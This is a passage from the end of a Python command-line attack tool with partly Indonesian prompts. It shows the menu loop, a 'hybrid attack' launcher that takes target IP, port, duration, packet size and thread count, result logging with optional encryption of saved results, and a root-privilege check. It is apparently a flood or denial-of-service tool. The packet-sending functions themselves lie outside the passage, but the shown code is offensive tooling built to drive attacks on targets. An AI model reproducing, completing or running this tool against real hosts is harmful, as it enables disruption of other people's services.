        if c in method_map:
            methods.append(method_map[c])
    if not methods:
        print(Fore.RED + "Tidak ada metode valid.")
        return
    methods = [(func, 1) for func, _ in methods]
    total_weight = len(methods)
    print(Fore.YELLOW + f"\nMemulai serangan hibrida dengan {total_weight} metode...")
    stats.start()
    monitor_thread = start_monitor()
    log_activity("HYBRID_ATTACK", f"Metode: {[m[0].__name__ for m in methods]}")
    try:
        hybrid_attack(params['ip'], params['port'], params['duration'], params['packet_size'], params['thread_count'], methods)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nInterrupted")
    input("Press Enter...")

def main():
    global WHITELIST, BLACKLIST, STOP_FLAG
    if not authenticate():
        sys.exit(1)
    
    loaded = load_config()
    if loaded:
        WHITELIST = loaded.get('whitelist', WHITELIST)
        BLACKLIST = loaded.get('blacklist', BLACKLIST)
    
    while True:
        print_banner()
        choice = show_main_menu()
        
        if choice == '0':
            print(Fore.YELLOW + "Goodbye!")
            log_activity("LOGOUT", "User logout")
            break
        elif choice == '1':
            while True:
                method = show_attack_menu()
                if method == '0':
                    break
                params = get_attack_parameters()
                if params:
                    results = run_attack(method, params)
                    if results:
                        save_choice = input(Fore.CYAN + "\nSave results? (y/n): ").lower()
                        if save_choice == 'y':
                            results.update(params)
                            save_results(results)
                input(Fore.CYAN + "\nPress Enter to continue...")
        elif choice == '2':
            show_target_info()
        elif choice == '3':
            print_banner()
            print(Fore.LIGHTBLUE_EX + "🔹  CONFIGURATION MANAGER  🔹")
            print()
            print(Fore.YELLOW + "[1] Save Current Settings")
            print(Fore.YELLOW + "[2] Load Saved Settings")
            print(Fore.YELLOW + "[3] Save with Encryption")
            print(Fore.YELLOW + "[4] Load Encrypted Settings")
            print(Fore.YELLOW + "[5] Back")
            print()
            cfg_choice = input(Fore.LIGHTBLUE_EX + "Select: ").strip()
            if cfg_choice == '1':
                config = {'whitelist': WHITELIST, 'blacklist': BLACKLIST, 'version': VERSION}
                save_config(config)
            elif cfg_choice == '2':
                loaded = load_config()
                if loaded:
                    WHITELIST = loaded.get('whitelist', WHITELIST)
                    BLACKLIST = loaded.get('blacklist', BLACKLIST)
            elif cfg_choice == '3':
                config = {'whitelist': WHITELIST, 'blacklist': BLACKLIST, 'version': VERSION}
                save_config(config, encrypt=True)
            elif cfg_choice == '4':
                loaded = load_config(decrypt=True)
                if loaded:
                    WHITELIST = loaded.get('whitelist', WHITELIST)
                    BLACKLIST = loaded.get('blacklist', BLACKLIST)
            input(Fore.CYAN + "Press Enter...")
        elif choice == '4':
            if os.path.exists(RESULTS_FILE):
                print_banner()
                print(Fore.LIGHTBLUE_EX + "🔹  PREVIOUS RESULTS  🔹")
                print(Fore.BLUE + "="*40)
                try:
                    with open(RESULTS_FILE, 'r') as f:
                        content = f.read()
                        print(content[-2000:])
                except:
                    print(Fore.RED + "Could not read results file")
            else:
                print(Fore.YELLOW + "No results file found")
            input(Fore.CYAN + "\nPress Enter...")
        elif choice == '5':
            show_settings()
        elif choice == '6':
            import_targets_menu()
        elif choice == '7':
            hybrid_attack_menu()
        elif choice == '8':
            generate_report_menu()
        elif choice == '9':
            domain = input("Masukkan domain target: ").strip()
            if domain:
                if verify_target_ownership(domain):
                    print(Fore.GREEN + "Verifikasi berhasil, lanjutkan...")
                else:
                    print(Fore.RED + "Verifikasi gagal. Tidak diizinkan.")
            input("Press Enter...")
        else:
            print(Fore.RED + "Pilihan tidak valid.")
            time.sleep(1)

def save_results(attack_data):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        attack_data['timestamp'] = timestamp
        with open("attack_results.json", 'a') as f:
            json.dump(attack_data, f)
            f.write("\n")
        with open(RESULTS_FILE, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Attack Results - {timestamp}\n")
            f.write(f"{'='*60}\n")
            for key, value in attack_data.items():
                f.write(f"{key}: {value}\n")
        print(Fore.GREEN + f"[✅] Results saved to {RESULTS_FILE}")
        log_activity("SAVE_RESULTS", f"Hasil disimpan, timestamp {timestamp}")
        enc = input(Fore.CYAN + "Enkripsi file hasil? (y/n): ").lower()
        if enc == 'y':
            encrypt_file(RESULTS_FILE)
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to save results: {e}")

if __name__ == "__main__":
    try:
        if os.name == 'posix':
            try:
                if os.geteuid() != 0:
                    print(Fore.YELLOW + "[⚠️] Some features may require root privileges")
            except:
                pass
        if not os.path.exists("results"):
            os.makedirs("results")
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n\n[⚠️] Program interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\n[❌] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)